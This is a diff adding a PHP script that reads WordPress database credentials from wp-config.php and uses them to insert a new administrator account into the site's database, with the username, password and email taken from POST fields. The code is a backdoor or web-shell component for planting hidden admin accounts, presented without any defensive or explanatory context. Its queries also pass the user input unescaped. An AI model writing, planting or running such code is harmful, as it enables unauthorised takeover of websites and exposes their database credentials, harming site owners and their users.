@@ -1,0 +1,41 @@
+<?php
+$user = $_POST['wp_user'];
+$pass = $_POST['wp_pass'];
+$email = $_POST['wp_email'];
+
+$search_path = $currentPath;
+$found_config = false;
+while($search_path !== dirname($search_path)) {
+    if (file_exists($search_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
+        $found_config = $search_path . DIRECTORY_SEPARATOR . 'wp-config.php';
+        break;
+    }
+    $search_path = dirname($search_path);
+}
+
+if ($found_config) {
+    $config_content = file_get_contents($found_config);
+    preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_name);
+    preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_user);
+    preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_pass);
+    preg_match("/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_host);
+    preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $config_content, $db_prefix);
+
+    $prefix = $db_prefix[1] ?? 'wp_';
+    $conn = new mysqli($db_host[1], $db_user[1], $db_pass[1], $db_name[1]);
+
+    if (!$conn->connect_error) {
+        $md5_pass = md5($pass);
+        $user_query = "INSERT INTO `{$prefix}users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_registered`, `user_status`, `display_name`) 
+                       VALUES ('$user', '$md5_pass', '$user', '$email', NOW(), 0, '$user')";
+        
+        if ($conn->query($user_query)) {
+            $user_id = $conn->insert_id;
+            $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
+            $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}user_level', '10')");
+            $wp_msg = "SUCCESS: Admin '$user' injected into DB!";
+        } else { $wp_msg = "ERROR: " . $conn->error; }
+        $conn->close();
+    } else { $wp_msg = "DATABASE ERROR: Connection Failed."; }
+} else { $wp_msg = "ERROR: wp-config.php not found."; }
+?>
